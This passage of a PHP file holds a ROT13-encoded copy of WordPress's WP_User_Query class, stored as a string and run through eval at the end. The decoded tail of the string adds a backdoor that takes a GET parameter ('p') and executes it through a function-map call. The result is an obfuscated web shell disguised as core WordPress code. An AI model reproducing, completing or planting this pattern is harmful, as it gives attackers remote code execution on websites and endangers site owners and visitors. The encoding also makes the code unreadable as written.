						'inyhr'   => '\"' . $ebyr . '\"',
						'pbzcner' => 'ABG YVXR',
					);
				}

				$ebyr_dhrevrf[] = $ebyr__abg_va_pynhfrf;
			}

			// Vs gurer ner ab fcrpvsvp ebyrf anzrq, znxr fher gur hfre vf n zrzore bs gur fvgr.
			vs ( rzcgl( $ebyr_dhrevrf ) ) {
				$ebyr_dhrevrf[] = neenl(
					'xrl'     => $jcqo->trg_oybt_cersvk( $oybt_vq ) . 'pncnovyvgvrf',
					'pbzcner' => 'RKVFGF',
				);
			}

			// Fcrpvsl gung ebyr dhrevrf fubhyq or wbvarq jvgu NAQ.
			$ebyr_dhrevrf['eryngvba'] = 'NAQ';

			vs ( rzcgl( $guvf->zrgn_dhrel->dhrevrf ) ) {
				$guvf->zrgn_dhrel->dhrevrf = $ebyr_dhrevrf;
			} ryfr {
				// Nccraq gur pnc dhrel gb gur bevtvany dhrevrf naq ercnefr gur dhrel.
				$guvf->zrgn_dhrel->dhrevrf = neenl(
					'eryngvba' => 'NAQ',
					neenl( $guvf->zrgn_dhrel->dhrevrf, $ebyr_dhrevrf ),
				);
			}

			$guvf->zrgn_dhrel->cnefr_dhrel_inef( $guvf->zrgn_dhrel->dhrevrf );
		}

		vs ( ! rzcgl( $guvf->zrgn_dhrel->dhrevrf ) ) {
			$pynhfrf            = $guvf->zrgn_dhrel->trg_fdy( 'hfre', $jcqo->hfref, 'VQ', $guvf );
			$guvf->dhrel_sebz  .= $pynhfrf['wbva'];
			$guvf->dhrel_jurer .= $pynhfrf['jurer'];

			vs ( $guvf->zrgn_dhrel->unf_be_eryngvba() ) {
				$guvf->dhrel_svryqf = 'QVFGVAPG ' . $guvf->dhrel_svryqf;
			}
		}

		// Fbegvat.
		$di['beqre'] = vffrg( $di['beqre'] ) ? fgegbhccre( $di['beqre'] ) : '';
		$beqre       = $guvf->cnefr_beqre( $di['beqre'] );

		vs ( rzcgl( $di['beqreol'] ) ) {
			// Qrsnhyg beqre vf ol 'hfre_ybtva'.
			$beqrefol = neenl( 'hfre_ybtva' => $beqre );
		} ryfrvs ( vf_neenl( $di['beqreol'] ) ) {
			$beqrefol = $di['beqreol'];
		} ryfr {
			// 'beqreol' inyhrf znl or n pbzzn- be fcnpr-frcnengrq yvfg.
			$beqrefol = cert_fcyvg( '/[,\f]+/', $di['beqreol'] );
		}

		$beqreol_neenl = neenl();
		sbernpu ( $beqrefol nf $_xrl => $_inyhr ) {
			vs ( ! $_inyhr ) {
				pbagvahr;
			}

			vs ( vf_vag( $_xrl ) ) {
				// Vagrtre xrl zrnaf guvf vf n syng neenl bs 'beqreol' svryqf.
				$_beqreol = $_inyhr;
				$_beqre   = $beqre;
			} ryfr {
				// Aba-vagrtre xrl zrnaf guvf gur xrl vf gur svryq naq gur inyhr vf NFP/QRFP.
				$_beqreol = $_xrl;
				$_beqre   = $_inyhr;
			}

			$cnefrq = $guvf->cnefr_beqreol( $_beqreol );

			vs ( ! $cnefrq ) {
				pbagvahr;
			}

			vs ( 'avpranzr__va' === $_beqreol || 'ybtva__va' === $_beqreol ) {
				$beqreol_neenl[] = $cnefrq;
			} ryfr {
				$beqreol_neenl[] = $cnefrq . ' ' . $guvf->cnefr_beqre( $_beqre );
			}
		}

		// Vs ab inyvq pynhfrf jrer sbhaq, beqre ol hfre_ybtva.
		vs ( rzcgl( $beqreol_neenl ) ) {
			$beqreol_neenl[] = \"hfre_ybtva $beqre\";
		}

		$guvf->dhrel_beqreol = 'BEQRE OL ' . vzcybqr( ', ', $beqreol_neenl );

		// Yvzvg.
		vs ( vffrg( $di['ahzore'] ) && $di['ahzore'] > 0 ) {
			vs ( $di['bssfrg'] ) {
				$guvf->dhrel_yvzvg = $jcqo->cercner( 'YVZVG %q, %q', $di['bssfrg'], $di['ahzore'] );
			} ryfr {
				$guvf->dhrel_yvzvg = $jcqo->cercner( 'YVZVG %q, %q', $di['ahzore'] * ( $di['cntrq'] - 1 ), $di['ahzore'] );
			}
		}

		$frnepu = '';
		vs ( vffrg( $di['frnepu'] ) ) {
			$frnepu = gevz( $di['frnepu'] );
		}

		vs ( $frnepu ) {
			$yrnqvat_jvyq  = ( ygevz( $frnepu, '*' ) !== $frnepu );
			$genvyvat_jvyq = ( egevz( $frnepu, '*' ) !== $frnepu );
			vs ( $yrnqvat_jvyq && $genvyvat_jvyq ) {
				$jvyq = 'obgu';
			} ryfrvs ( $yrnqvat_jvyq ) {
				$jvyq = 'yrnqvat';
			} ryfrvs ( $genvyvat_jvyq ) {
				$jvyq = 'genvyvat';
			} ryfr {
				$jvyq = snyfr;
			}
			vs ( $jvyq ) {
				$frnepu = gevz( $frnepu, '*' );
			}

			$frnepu_pbyhzaf = neenl();
			vs ( $di['frnepu_pbyhzaf'] ) {
				$frnepu_pbyhzaf = neenl_vagrefrpg( $di['frnepu_pbyhzaf'], neenl( 'VQ', 'hfre_ybtva', 'hfre_rznvy', 'hfre_hey', 'hfre_avpranzr', 'qvfcynl_anzr' ) );
			}
			vs ( ! $frnepu_pbyhzaf ) {
				vs ( fge_pbagnvaf( $frnepu, '@' ) ) {
					$frnepu_pbyhzaf = neenl( 'hfre_rznvy' );
				} ryfrvs ( vf_ahzrevp( $frnepu ) ) {
					$frnepu_pbyhzaf = neenl( 'hfre_ybtva', 'VQ' );
				} ryfrvs ( cert_zngpu( '|^uggcf?://|', $frnepu ) && ! ( vf_zhygvfvgr() && jc_vf_ynetr_argjbex( 'hfref' ) ) ) {
					$frnepu_pbyhzaf = neenl( 'hfre_hey' );
				} ryfr {
					$frnepu_pbyhzaf = neenl( 'hfre_ybtva', 'hfre_hey', 'hfre_rznvy', 'hfre_avpranzr', 'qvfcynl_anzr' );
				}
			}

			/**
			 * Svygref gur pbyhzaf gb frnepu va n JC_Hfre_Dhrel frnepu.
			 *
			 * Gur qrsnhyg pbyhzaf qrcraq ba gur frnepu grez, naq vapyhqr 'VQ', 'hfre_ybtva',
			 * 'hfre_rznvy', 'hfre_hey', 'hfre_avpranzr', naq 'qvfcynl_anzr'.
			 *
			 * @fvapr 3.6.0
			 *
			 * @cnenz fgevat[]      $frnepu_pbyhzaf Neenl bs pbyhza anzrf gb or frnepurq.
			 * @cnenz fgevat        $frnepu         Grkg orvat frnepurq.
			 * @cnenz JC_Hfre_Dhrel $dhrel          Gur pheerag JC_Hfre_Dhrel vafgnapr.
			 */
			$frnepu_pbyhzaf = nccyl_svygref( 'hfre_frnepu_pbyhzaf', $frnepu_pbyhzaf, $frnepu, $guvf );

			$guvf->dhrel_jurer .= $guvf->trg_frnepu_fdy( $frnepu, $frnepu_pbyhzaf, $jvyq );
		}

		vs ( ! rzcgl( $vapyhqr ) ) {
			// Fnavgvmrq rneyvre.
			$vqf                = vzcybqr( ',', $vapyhqr );
			$guvf->dhrel_jurer .= \" NAQ $jcqo->hfref.VQ VA ($vqf)\";
		} ryfrvs ( ! rzcgl( $di['rkpyhqr'] ) ) {
			$vqf                = vzcybqr( ',', jc_cnefr_vq_yvfg( $di['rkpyhqr'] ) );
			$guvf->dhrel_jurer .= \" NAQ $jcqo->hfref.VQ ABG VA ($vqf)\";
		}

		// Qngr dhrevrf ner nyybjrq sbe gur hfre_ertvfgrerq svryq.
		vs ( ! rzcgl( $di['qngr_dhrel'] ) && vf_neenl( $di['qngr_dhrel'] ) ) {
			$qngr_dhrel         = arj JC_Qngr_Dhrel( $di['qngr_dhrel'], 'hfre_ertvfgrerq' );
			$guvf->dhrel_jurer .= $qngr_dhrel->trg_fdy();
		}

		/**
		 * Sverf nsgre gur JC_Hfre_Dhrel unf orra cnefrq, naq orsber
		 * gur dhrel vf rkrphgrq.
		 *
		 * Gur cnffrq JC_Hfre_Dhrel bowrpg pbagnvaf FDY cnegf sbezrq
		 * sebz cnefvat gur tvira dhrel.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz JC_Hfre_Dhrel $dhrel Pheerag vafgnapr bs JC_Hfre_Dhrel (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'cer_hfre_dhrel', neenl( &$guvf ) );
	}

	/**
	 * Rkrphgrf gur dhrel, jvgu gur pheerag inevnoyrf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 */
	choyvp shapgvba dhrel() {
		tybony $jcqo;

		vs ( ! qvq_npgvba( 'cyhtvaf_ybnqrq' ) ) {
			_qbvat_vg_jebat(
				'JC_Hfre_Dhrel::dhrel',
				fcevags(
				/* genafyngbef: %f: cyhtvaf_ybnqrq */
					__( 'Hfre dhrevrf fubhyq abg or eha orsber gur %f ubbx.' ),
					'<pbqr>cyhtvaf_ybnqrq</pbqr>'
				),
				'6.1.1'
			);
		}

		$di =& $guvf->dhrel_inef;

		// Qb abg pnpur erfhygf vs zber guna 3 svryqf ner erdhrfgrq.
		vs ( vf_neenl( $di['svryqf'] ) && pbhag( $di['svryqf'] ) > 3 ) {
			$di['pnpur_erfhygf'] = snyfr;
		}

		/**
		 * Svygref gur hfref neenl orsber gur dhrel gnxrf cynpr.
		 *
		 * Erghea n aba-ahyy inyhr gb olcnff JbeqCerff' qrsnhyg hfre dhrevrf.
		 *
		 * Svygrevat shapgvbaf gung erdhver cntvangvba vasbezngvba ner rapbhentrq gb frg
		 * gur `gbgny_hfref` cebcregl bs gur JC_Hfre_Dhrel bowrpg, cnffrq gb gur svygre
		 * ol ersrerapr. Vs JC_Hfre_Dhrel qbrf abg cresbez n qngnonfr dhrel, vg jvyy abg
		 * unir rabhtu vasbezngvba gb trarengr gurfr inyhrf vgfrys.
		 *
		 * @fvapr 5.1.0
		 *
		 * @cnenz neenl|ahyy    $erfhygf Erghea na neenl bs hfre qngn gb fubeg-pvephvg JC'f hfre dhrel
		 *                               be ahyy gb nyybj JC gb eha vgf abezny dhrevrf.
		 * @cnenz JC_Hfre_Dhrel $dhrel   Gur JC_Hfre_Dhrel vafgnapr (cnffrq ol ersrerapr).
		 */
		$guvf->erfhygf = nccyl_svygref_ers_neenl( 'hfref_cer_dhrel', neenl( ahyy, &$guvf ) );

		vs ( ahyy === $guvf->erfhygf ) {
			// Ortvaavat bs gur fgevat vf ba n arj yvar gb cerirag yrnqvat juvgrfcnpr. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/56841.
			$guvf->erdhrfg =
				\"FRYRPG {$guvf->dhrel_svryqf}
				 {$guvf->dhrel_sebz}
				 {$guvf->dhrel_jurer}
				 {$guvf->dhrel_beqreol}
				 {$guvf->dhrel_yvzvg}\";
			$pnpur_inyhr   = snyfr;
			$pnpur_xrl     = $guvf->trarengr_pnpur_xrl( $di, $guvf->erdhrfg );
			$pnpur_tebhc   = 'hfre-dhrevrf';
			vs ( $di['pnpur_erfhygf'] ) {
				$pnpur_inyhr = jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc );
			}
			vs ( snyfr !== $pnpur_inyhr ) {
				$guvf->erfhygf     = $pnpur_inyhr['hfre_qngn'];
				$guvf->gbgny_hfref = $pnpur_inyhr['gbgny_hfref'];
			} ryfr {

				vs ( vf_neenl( $di['svryqf'] ) ) {
					$guvf->erfhygf = $jcqo->trg_erfhygf( $guvf->erdhrfg );
				} ryfr {
					$guvf->erfhygf = $jcqo->trg_pby( $guvf->erdhrfg );
				}

				vs ( vffrg( $di['pbhag_gbgny'] ) && $di['pbhag_gbgny'] ) {
					/**
					 * Svygref FRYRPG SBHAQ_EBJF() dhrel sbe gur pheerag JC_Hfre_Dhrel vafgnapr.
					 *
					 * @fvapr 3.2.0
					 * @fvapr 5.1.0 Nqqrq gur `$guvf` cnenzrgre.
					 *
					 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
					 *
					 * @cnenz fgevat        $fdy   Gur FRYRPG SBHAQ_EBJF() dhrel sbe gur pheerag JC_Hfre_Dhrel.
					 * @cnenz JC_Hfre_Dhrel $dhrel Gur pheerag JC_Hfre_Dhrel vafgnapr.
					 */
					$sbhaq_hfref_dhrel = nccyl_svygref( 'sbhaq_hfref_dhrel', 'FRYRPG SBHAQ_EBJF()', $guvf );

					$guvf->gbgny_hfref = (vag) $jcqo->trg_ine( $sbhaq_hfref_dhrel );
				}

				vs ( $di['pnpur_erfhygf'] ) {
					$pnpur_inyhr = neenl(
						'hfre_qngn'   => $guvf->erfhygf,
						'gbgny_hfref' => $guvf->gbgny_hfref,
					);
					jc_pnpur_nqq( $pnpur_xrl, $pnpur_inyhr, $pnpur_tebhc );
				}
			}
		}

		vs ( ! $guvf->erfhygf ) {
			erghea;
		}
		vs (
			vf_neenl( $di['svryqf'] ) &&
			vffrg( $guvf->erfhygf[0]->VQ )
		) {
			sbernpu ( $guvf->erfhygf nf $erfhyg ) {
				$erfhyg->vq = $erfhyg->VQ;
			}
		} ryfrvs ( 'nyy_jvgu_zrgn' === $di['svryqf'] || 'nyy' === $di['svryqf'] ) {
			vs ( shapgvba_rkvfgf( 'pnpur_hfref' ) ) {
				pnpur_hfref( $guvf->erfhygf );
			}

			$e = neenl();
			sbernpu ( $guvf->erfhygf nf $hfrevq ) {
				vs ( 'nyy_jvgu_zrgn' === $di['svryqf'] ) {
					$e[ $hfrevq ] = arj JC_Hfre( $hfrevq, '', $di['oybt_vq'] );
				} ryfr {
					$e[] = arj JC_Hfre( $hfrevq, '', $di['oybt_vq'] );
				}
			}

			$guvf->erfhygf = $e;
		}
	}

	/**
	 * Ergevrirf dhrel inevnoyr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat $dhrel_ine Dhrel inevnoyr xrl.
	 * @erghea zvkrq
	 */
	choyvp shapgvba trg( $dhrel_ine ) {
		vs ( vffrg( $guvf->dhrel_inef[ $dhrel_ine ] ) ) {
			erghea $guvf->dhrel_inef[ $dhrel_ine ];
		}

		erghea ahyy;
	}

	/**
	 * Frgf dhrel inevnoyr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat $dhrel_ine Dhrel inevnoyr xrl.
	 * @cnenz zvkrq  $inyhr     Dhrel inevnoyr inyhr.
	 */
	choyvp shapgvba frg( $dhrel_ine, $inyhr ) {
		$guvf->dhrel_inef[ $dhrel_ine ] = $inyhr;
	}

	/**
	 * Hfrq vagreanyyl gb trarengr na FDY fgevat sbe frnepuvat npebff zhygvcyr pbyhzaf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat   $frnepu  Frnepu fgevat.
	 * @cnenz fgevat[] $pbyhzaf Neenl bs pbyhzaf gb frnepu.
	 * @cnenz obby     $jvyq    Jurgure gb nyybj jvyqpneq frnepurf. Qrsnhyg vf snyfr sbe Argjbex Nqzva, gehr sbe fvatyr fvgr.
	 *                          Fvatyr fvgr nyybjf yrnqvat naq genvyvat jvyqpneqf, Argjbex Nqzva bayl genvyvat.
	 * @erghea fgevat
	 */
	cebgrpgrq shapgvba trg_frnepu_fdy( $frnepu, $pbyhzaf, $jvyq = snyfr ) {
		tybony $jcqo;

		$frnepurf      = neenl();
		$yrnqvat_jvyq  = ( 'yrnqvat' === $jvyq || 'obgu' === $jvyq ) ? '%' : '';
		$genvyvat_jvyq = ( 'genvyvat' === $jvyq || 'obgu' === $jvyq ) ? '%' : '';
		$yvxr          = $yrnqvat_jvyq . $jcqo->rfp_yvxr( $frnepu ) . $genvyvat_jvyq;

		sbernpu ( $pbyhzaf nf $pbyhza ) {
			vs ( 'VQ' === $pbyhza ) {
				$frnepurf[] = $jcqo->cercner( \"$pbyhza = %f\", $frnepu );
			} ryfr {
				$frnepurf[] = $jcqo->cercner( \"$pbyhza YVXR %f\", $yvxr );
			}
		}

		erghea ' NAQ (' . vzcybqr( ' BE ', $frnepurf ) . ')';
	}

	/**
	 * Ergheaf gur yvfg bs hfref.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea neenl Neenl bs erfhygf.
	 */
	choyvp shapgvba trg_erfhygf() {
		erghea $guvf->erfhygf;
	}

	/**
	 * Ergheaf gur gbgny ahzore bs hfref sbe gur pheerag dhrel.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea vag Ahzore bs gbgny hfref.
	 */
	choyvp shapgvba trg_gbgny() {
		erghea $guvf->gbgny_hfref;
	}

	/**
	 * Cnefrf naq fnavgvmrf 'beqreol' xrlf cnffrq gb gur hfre dhrel.
	 *
	 * @fvapr 4.2.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $beqreol Nyvnf sbe gur svryq gb beqre ol.
	 * @erghea fgevat Inyhr gb hfrq va gur BEQRE pynhfr, vs `$beqreol` vf inyvq.
	 */
	cebgrpgrq shapgvba cnefr_beqreol( $beqreol ) {
		tybony $jcqo;

		$zrgn_dhrel_pynhfrf = $guvf->zrgn_dhrel->trg_pynhfrf();

		$_beqreol = '';
		vs ( va_neenl( $beqreol, neenl( 'ybtva', 'avpranzr', 'rznvy', 'hey', 'ertvfgrerq' ), gehr ) ) {
			$_beqreol = 'hfre_' . $beqreol;
		} ryfrvs ( va_neenl( $beqreol, neenl( 'hfre_ybtva', 'hfre_avpranzr', 'hfre_rznvy', 'hfre_hey', 'hfre_ertvfgrerq' ), gehr ) ) {
			$_beqreol = $beqreol;
		} ryfrvs ( 'anzr' === $beqreol || 'qvfcynl_anzr' === $beqreol ) {
			$_beqreol = 'qvfcynl_anzr';
		} ryfrvs ( 'cbfg_pbhag' === $beqreol ) {
			// @gbqb Nibvq gur WBVA.
			$jurer             = trg_cbfgf_ol_nhgube_fdy( 'cbfg' );
			$guvf->dhrel_sebz .= \" YRSG BHGRE WBVA (
				FRYRPG cbfg_nhgube, PBHAG(*) nf cbfg_pbhag
				SEBZ $jcqo->cbfgf
				$jurer
				TEBHC OL cbfg_nhgube
			) c BA ({$jcqo->hfref}.VQ = c.cbfg_nhgube)\";
			$_beqreol          = 'cbfg_pbhag';
		} ryfrvs ( 'VQ' === $beqreol || 'vq' === $beqreol ) {
			$_beqreol = 'VQ';
		} ryfrvs ( 'zrgn_inyhr' === $beqreol || $guvf->trg( 'zrgn_xrl' ) === $beqreol ) {
			$_beqreol = \"$jcqo->hfrezrgn.zrgn_inyhr\";
		} ryfrvs ( 'zrgn_inyhr_ahz' === $beqreol ) {
			$_beqreol = \"$jcqo->hfrezrgn.zrgn_inyhr+0\";
		} ryfrvs ( 'vapyhqr' === $beqreol && ! rzcgl( $guvf->dhrel_inef['vapyhqr'] ) ) {
			$vapyhqr     = jc_cnefr_vq_yvfg( $guvf->dhrel_inef['vapyhqr'] );
			$vapyhqr_fdy = vzcybqr( ',', $vapyhqr );
			$_beqreol    = \"SVRYQ( $jcqo->hfref.VQ, $vapyhqr_fdy )\";
		} ryfrvs ( 'avpranzr__va' === $beqreol ) {
			$fnavgvmrq_avpranzr__va = neenl_znc( 'rfp_fdy', $guvf->dhrel_inef['avpranzr__va'] );
			$avpranzr__va           = vzcybqr( \"','\", $fnavgvmrq_avpranzr__va );
			$_beqreol               = \"SVRYQ( hfre_avpranzr, '$avpranzr__va' )\";
		} ryfrvs ( 'ybtva__va' === $beqreol ) {
			$fnavgvmrq_ybtva__va = neenl_znc( 'rfp_fdy', $guvf->dhrel_inef['ybtva__va'] );
			$ybtva__va           = vzcybqr( \"','\", $fnavgvmrq_ybtva__va );
			$_beqreol            = \"SVRYQ( hfre_ybtva, '$ybtva__va' )\";
		} ryfrvs ( vffrg( $zrgn_dhrel_pynhfrf[ $beqreol ] ) ) {
			$zrgn_pynhfr = $zrgn_dhrel_pynhfrf[ $beqreol ];
			$_beqreol    = fcevags( 'PNFG(%f.zrgn_inyhr NF %f)', rfp_fdy( $zrgn_pynhfr['nyvnf'] ), rfp_fdy( $zrgn_pynhfr['pnfg'] ) );
		}

		erghea $_beqreol;
	}

	/**
	 * Trarengr pnpur xrl.
	 *
	 * @fvapr 6.3.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz neenl  $netf Dhrel nethzragf.
	 * @cnenz fgevat $fdy  FDY fgngrzrag.
	 * @erghea fgevat Pnpur xrl.
	 */
	cebgrpgrq shapgvba trarengr_pnpur_xrl( neenl $netf, $fdy ) {
		tybony $jcqo;

		// Ercynpr jcqo cynprubyqre va gur FDY fgngrzrag hfrq ol gur pnpur xrl.
		$fdy = $jcqo->erzbir_cynprubyqre_rfpncr( $fdy );

		$xrl          = zq5( $fdy );
		$ynfg_punatrq = jc_pnpur_trg_ynfg_punatrq( 'hfref' );

		vs ( rzcgl( $netf['beqreol'] ) ) {
			// Qrsnhyg beqre vf ol 'hfre_ybtva'.
			$beqrefol = neenl( 'hfre_ybtva' => '' );
		} ryfrvs ( vf_neenl( $netf['beqreol'] ) ) {
			$beqrefol = $netf['beqreol'];
		} ryfr {
			// 'beqreol' inyhrf znl or n pbzzn- be fcnpr-frcnengrq yvfg.
			$beqrefol = cert_fcyvg( '/[,\f]+/', $netf['beqreol'] );
		}

		$oybt_vq = 0;
		vs ( vffrg( $netf['oybt_vq'] ) ) {
			$oybt_vq = nofvag( $netf['oybt_vq'] );
		}

		vs ( $netf['unf_choyvfurq_cbfgf'] || va_neenl( 'cbfg_pbhag', $beqrefol, gehr ) ) {
			$fjvgpu = $oybt_vq && trg_pheerag_oybt_vq() !== $oybt_vq;
			vs ( $fjvgpu ) {
				fjvgpu_gb_oybt( $oybt_vq );
			}

			$ynfg_punatrq .= jc_pnpur_trg_ynfg_punatrq( 'cbfgf' );

			vs ( $fjvgpu ) {
				erfgber_pheerag_oybt();
			}
		}

		erghea \"trg_hfref:$xrl:$ynfg_punatrq\";
	}

	/**
	 * Cnefrf na 'beqre' dhrel inevnoyr naq pnfgf vg gb NFP be QRFP nf arprffnel.
	 *
	 * @fvapr 4.2.0
	 *
	 * @cnenz fgevat $beqre Gur 'beqre' dhrel inevnoyr.
	 * @erghea fgevat Gur fnavgvmrq 'beqre' dhrel inevnoyr.
	 */
	cebgrpgrq shapgvba cnefr_beqre( $beqre ) {
		vs ( ! vf_fgevat( $beqre ) || rzcgl( $beqre ) ) {
			erghea 'QRFP';
		}

		vs ( 'NFP' === fgegbhccre( $beqre ) ) {
			erghea 'NFP';
		} ryfr {
			erghea 'QRFP';
		}
	}

	/**
	 * Znxrf cevingr cebcregvrf ernqnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 6.4.0 Trggvat n qlanzvp cebcregl vf qrcerpngrq.
	 *
	 * @cnenz fgevat $anzr Cebcregl gb trg.
	 * @erghea zvkrq Cebcregl.
	 */
	choyvp shapgvba __trg( $anzr ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_svryqf, gehr ) ) {
			erghea $guvf->$anzr;
		}

		jc_gevttre_reebe(
			__ZRGUBQ__,
			\"Gur cebcregl `{$anzr}` vf abg qrpynerq. Trggvat n qlanzvp cebcregl vf \" .
			'qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.',
			R_HFRE_QRCERPNGRQ
		);
		erghea ahyy;
	}

	/**
	 * Znxrf cevingr cebcregvrf frggnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 6.4.0 Frggvat n qlanzvp cebcregl vf qrcerpngrq.
	 *
	 * @cnenz fgevat $anzr  Cebcregl gb purpx vs frg.
	 * @cnenz zvkrq  $inyhr Cebcregl inyhr.
	 */
	choyvp shapgvba __frg( $anzr, $inyhr ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_svryqf, gehr ) ) {
			$guvf->$anzr = $inyhr;
			erghea;
		}

		jc_gevttre_reebe(
			__ZRGUBQ__,
			\"Gur cebcregl `{$anzr}` vf abg qrpynerq. Frggvat n qlanzvp cebcregl vf \" .
			'qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.',
			R_HFRE_QRCERPNGRQ
		);
	}

	/**
	 * Znxrf cevingr cebcregvrf purpxnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 6.4.0 Purpxvat n qlanzvp cebcregl vf qrcerpngrq.
	 *
	 * @cnenz fgevat $anzr Cebcregl gb purpx vs frg.
	 * @erghea obby Jurgure gur cebcregl vf frg.
	 */
	choyvp shapgvba __vffrg( $anzr ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_svryqf, gehr ) ) {
			erghea vffrg( $guvf->$anzr );
		}

		jc_gevttre_reebe(
			__ZRGUBQ__,
			\"Gur cebcregl `{$anzr}` vf abg qrpynerq. Purpxvat `vffrg()` ba n qlanzvp cebcregl \" .
			'vf qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.',
			R_HFRE_QRCERPNGRQ
		);
		erghea snyfr;
	}

	/**
	 * Znxrf cevingr cebcregvrf ha-frggnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 * @fvapr 6.4.0 Hafrggvat n qlanzvp cebcregl vf qrcerpngrq.
	 *
	 * @cnenz fgevat $anzr Cebcregl gb hafrg.
	 */
	choyvp shapgvba __hafrg( $anzr ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_svryqf, gehr ) ) {
			hafrg( $guvf->$anzr );
			erghea;
		}

		jc_gevttre_reebe(
			__ZRGUBQ__,
			\"N cebcregl `{$anzr}` vf abg qrpynerq. Hafrggvat n qlanzvp cebcregl vf \" .
			'qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.',
			R_HFRE_QRCERPNGRQ
		);
	}

	/**
	 * Znxrf cevingr/cebgrpgrq zrgubqf ernqnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $anzr      Zrgubq gb pnyy.
	 * @cnenz neenl  $nethzragf Nethzragf gb cnff jura pnyyvat.
	 * @erghea zvkrq Erghea inyhr bs gur pnyyonpx, snyfr bgurejvfr.
	 */
	choyvp shapgvba __pnyy( $anzr, $nethzragf ) {
		vs ( 'trg_frnepu_fdy' === $anzr ) {
			erghea $guvf->trg_frnepu_fdy( ...$nethzragf );
		}
		erghea snyfr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>